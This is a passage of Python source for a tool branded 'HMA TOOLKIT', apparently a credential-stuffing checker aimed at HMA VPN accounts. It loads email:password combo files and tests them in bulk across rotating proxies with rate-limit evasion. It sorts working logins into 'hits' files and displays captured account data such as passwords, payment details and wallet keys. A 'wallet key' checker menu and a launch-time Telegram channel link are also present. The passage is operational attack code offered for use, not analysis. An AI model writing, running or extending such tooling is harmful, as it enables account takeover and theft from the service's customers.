    lock = asyncio.Lock()
    gap = HMA_CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _ha_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _ha_stop.is_set():
                return

            proxy = Hma_pick_proxy()
            try:
                result = await Hma_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Hma_record(combo, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {combo[:30]}: {e}", flush=True)

            queue.task_done()

    n = max(1, HMA_CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Hma_single_check(proxies):
    Hma_verify("single_check")
    global _ha_pool, _ha_bad_proxies
    _ha_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _ha_pool:
            _ha_pool = list(proxies)
            _ha_bad_proxies = set()
        proxy = Hma_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Hma_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free", "expired", "not_verified"):
        u = result.get("user", {}) or {}
        verdict = {"hit": "PAID", "free": "FREE",
                   "expired": "EXPIRED", "not_verified": "NOT VERIFIED"}.get(result["status"], result["status"])
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Password", u.get("password", "-")),
            ("Username", u.get("username", "-")),
            ("Verified", "Yes" if u.get("verified") else "No"),
            ("UUID", u.get("uuid", "-")),
            ("First Name", u.get("first_name") or "-"),
            ("Last Name", u.get("last_name") or "-"),
            ("Plan", u.get("plan", "-")),
            ("Product ID", u.get("product_id", "-")),
            ("Max Devices", u.get("maximum", "-")),
            ("Overused", str(u.get("overused", "-"))),
            ("Expires", u.get("expires_iso", "-")),
            ("Days Left", str(u.get("days_left", 0))),
            ("Expired", u.get("expired", "-")),
            ("Payment", u.get("payment", "-")),
            ("Subscription ID", u.get("subscription_id", "-")),
            ("Wallet Keys", u.get("wallet_keys", "-")),
            ("Licenses", str(u.get("lic_count", 0))),
            ("LICT", (u.get("lic_ticket") or "-")[:60]),
            ("DEVT", (u.get("devt_ticket") or "-")[:60]),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", HA_TAG),
        ]
        Eyelifter_summary(rows)
    elif result.get("status") == "bad":
        Eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('message', 'rejected')}")
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Hma_bulk_check(proxies):
    Hma_verify("bulk_check")
    global _ha_total, _ha_hits_f, _ha_expired_f
    global _ha_free_f, _ha_bad_f, _ha_notverified_f
    global _ha_err_f, _ha_folder, _ha_pool, _ha_bad_proxies, _ha_pbar
    Hma_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = Hma_extract_combos(content)
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(HA_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _ha_folder = os.path.join(HA_DIR, f"Session_{ts}_{rand_tag}")
    os.makedirs(_ha_folder, exist_ok=True)

    _ha_hits_f = open(os.path.join(_ha_folder, "hma_hits.txt"), "w", encoding="utf-8")
    _ha_expired_f = open(os.path.join(_ha_folder, "hma_expired.txt"), "w", encoding="utf-8")
    _ha_free_f = open(os.path.join(_ha_folder, "hma_free.txt"), "w", encoding="utf-8")
    _ha_notverified_f = open(os.path.join(_ha_folder, "hma_not_verified.txt"), "w", encoding="utf-8")
    _ha_bad_f = open(os.path.join(_ha_folder, "hma_bad.txt"), "w", encoding="utf-8")
    _ha_err_f = open(os.path.join(_ha_folder, "hma_errors.txt"), "w", encoding="utf-8")

    header = (f"# HMA VPN Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {HA_TAG}\n"
              f"# Seal: {HA_SEAL}\n\n")
    for fh in (_ha_hits_f, _ha_expired_f, _ha_free_f,
               _ha_notverified_f, _ha_bad_f, _ha_err_f):
        fh.write(header)

    _ha_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_ha_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{HMA_CONFIG['threads']} timeout:{HMA_CONFIG['timeout']}s "
                  f"retries:{HMA_CONFIG['retries']} gap:{HMA_CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies, HMA_CONFIG)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_ha_hits_f, _ha_expired_f, _ha_free_f,
                       _ha_notverified_f, _ha_bad_f, _ha_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _ha_pool = working
        _ha_bad_proxies = set()
    else:
        _ha_pool = []
        _ha_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _ha_stop.clear()
    _ha_pbar = tqdm(
        total=_ha_total,
        desc="checking",
        unit="combo",
        ncols=80,
        dynamic_ncols=False,
        leave=True,
    )
    try:
        asyncio.run(Hma_bulk_runner(combos))
    except KeyboardInterrupt:
        _ha_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        if _ha_pbar is not None:
            try:
                _ha_pbar.close()
            except Exception:
                pass
            _ha_pbar = None
        for fh in (_ha_hits_f, _ha_expired_f, _ha_free_f,
                   _ha_notverified_f, _ha_bad_f, _ha_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, k in (
        ("hma_hits.txt", "hits"),
        ("hma_expired.txt", "expired"),
        ("hma_free.txt", "free"),
        ("hma_not_verified.txt", "not_verified"),
        ("hma_bad.txt", "bad"),
        ("hma_errors.txt", "errors"),
    ):
        old = os.path.join(_ha_folder, base)
        new = os.path.join(_ha_folder, base.replace(".txt", f"_{_ha_stats[k]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_ha_folder}")

    Eyelifter_divider()
    el = time.time() - _ha_start
    Eyelifter_summary([
        ("Total", _ha_total),
        ("Hits (paid)", _ha_stats["hits"]),
        ("Expired", _ha_stats["expired"]),
        ("Free", _ha_stats["free"]),
        ("Not verified", _ha_stats["not_verified"]),
        ("Bad creds", _ha_stats["bad"]),
        ("Errors", _ha_stats["errors"]),
        ("Rate limited", _ha_stats["rate_limited"]),
        ("Blocks", _ha_stats["blocks"]),
        ("Proxy fails", _ha_stats["proxy_fails"]),
        ("Retries", _ha_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _ha_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Hma_settings_menu():
    Hma_verify("settings")
    global HA_DEBUG, HA_REQ_TIMEOUT, HA_RATE_LIMIT_BACKOFF, HA_MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {HMA_CONFIG['threads']}")
    print(f"  [2]  Timeout:            {HMA_CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {HMA_CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {HMA_CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {HMA_CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {HMA_CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {HMA_CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {HMA_CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {HMA_CONFIG['skip_proxy_test']}")
    print(f"  [10] Debug:              {HMA_CONFIG['debug']}")
    print(f"  [11] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    try:
        if ch == "1":
            HMA_CONFIG["threads"] = max(1, min(100, int(input("Threads (1-100): "))))
            _ha_loader.settings["threads"] = HMA_CONFIG["threads"]
            changed = True
        elif ch == "2":
            HMA_CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _ha_loader.settings["timeout"] = HMA_CONFIG["timeout"]
            HA_REQ_TIMEOUT = HMA_CONFIG["timeout"]
            changed = True
        elif ch == "3":
            HMA_CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _ha_loader.settings["retries"] = HMA_CONFIG["retries"]
            changed = True
        elif ch == "4":
            HMA_CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _ha_loader.settings["retry_delay"] = HMA_CONFIG["retry_delay"]
            changed = True
        elif ch == "5":
            HMA_CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _ha_loader.settings["combo_delay"] = HMA_CONFIG["combo_delay"]
            changed = True
        elif ch == "6":
            HMA_CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _ha_loader.settings["rate_limit_backoff"] = HMA_CONFIG["rate_limit_backoff"]
            HA_RATE_LIMIT_BACKOFF = HMA_CONFIG["rate_limit_backoff"]
            changed = True
        elif ch == "7":
            HMA_CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _ha_loader.settings["max_rate_limit_retries"] = HMA_CONFIG["max_rate_limit_retries"]
            HA_MAX_RATE_LIMIT_RETRIES = HMA_CONFIG["max_rate_limit_retries"]
            changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                HMA_CONFIG["proxies_file"] = v
                _ha_loader.settings["proxies_file"] = v
                changed = True
        elif ch == "9":
            HMA_CONFIG["skip_proxy_test"] = not HMA_CONFIG["skip_proxy_test"]
            _ha_loader.settings["skip_proxy_test"] = HMA_CONFIG["skip_proxy_test"]
            changed = True
        elif ch == "10":
            HMA_CONFIG["debug"] = not HMA_CONFIG["debug"]
            _ha_loader.settings["debug"] = HMA_CONFIG["debug"]
            HA_DEBUG = HMA_CONFIG["debug"]
            changed = True
        elif ch == "11":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            _ha_loader.save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def hmakey_menu():
    proxies = Eyelifter_load_proxies(HMAKEY_CONFIG)
    while True:
        Hmakey_verify("menu")
        Eyelifter_section("HMA KEY CHECKER")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single key check")
        print("[2] Bulk key check from file")
        print("[3] Settings")
        print("[4] Back")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Hmakey_single_check(proxies)
        elif choice == "2":
            _hm_stop.clear()
            Hmakey_bulk_check(proxies)
        elif choice == "3":
            Hmakey_settings_menu()
            proxies = Eyelifter_load_proxies(HMAKEY_CONFIG)
        elif choice == "4":
            return
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


def hma_menu():
    proxies = Eyelifter_load_proxies(HMA_CONFIG)
    while True:
        Hma_verify("menu")
        Eyelifter_section("HMA ACCOUNT CHECKER")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Back")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Hma_single_check(proxies)
        elif choice == "2":
            _ha_stop.clear()
            Hma_bulk_check(proxies)
        elif choice == "3":
            Hma_settings_menu()
            proxies = Eyelifter_load_proxies(HMA_CONFIG)
        elif choice == "4":
            return
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


def Eyelifter_main():
    Hmakey_verify("main")
    Hma_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    threading.Thread(target=_delayed_open, daemon=True).start()
    Eyelifter_banner("HMA TOOLKIT", "Key + Account Checker", tag=HM_TAG)

    while True:
        Eyelifter_section("MAIN MENU")
        print("[1] HMA Wallet Key Checker")
        print("[2] HMA Account Checker")
        print("[3] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            hmakey_menu()
        elif choice == "2":
            hma_menu()
        elif choice == "3":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)